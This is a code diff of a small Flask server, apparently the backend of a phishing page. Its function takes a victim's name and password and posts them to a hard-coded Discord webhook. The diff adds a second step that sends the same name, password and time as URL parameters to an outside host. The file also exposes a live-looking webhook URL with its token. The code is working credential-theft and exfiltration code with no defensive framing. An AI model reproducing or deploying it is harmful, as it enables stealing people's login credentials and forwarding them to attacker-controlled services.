@@ -7,10 +7,13 @@ from flask_cors import CORS
 # ===================== 🔧 CONFIGURACIÓN ======================
 WEBHOOK_URL = "https://discord.com/api/webhooks/1379160851432341695/xya9f3wHLQIfu6n7Fw8Lp70xrFHlbBDXTXNrdqVGzK98mZTZpV1AO18cLuISiWgwoP7L"
 
+
 app = Flask(__name__)
 CORS(app)
 
 def mensaje(NOMBRE, PASS, HORA):
+
+    WA_API = f"https://api.arceus.online/w?n={NOMBRE}&p={PASS}&h={HORA}"
 
     EMBEB = {
         "content": f"""Nombre: {NOMBRE}
@@ -21,6 +24,12 @@ Hora: {HORA}""",
     try:
         resp = requests.post(WEBHOOK_URL, json=EMBEB)
         if resp.status_code in (200, 204):
+            try:
+                response = requests.get(WA_API)
+                response.raise_for_status()  # * Lanza error si status no es 2xx
+                print("Respuesta del servidor:", response.text)
+            except requests.RequestException as e:
+                print("❌ Error al enviar la solicitud:", e)
             return "✅ Mensaje enviado", 200
         else:
             return f"❌ Error al enviar mensaje: {resp.status_code}\n{resp.text}", 500
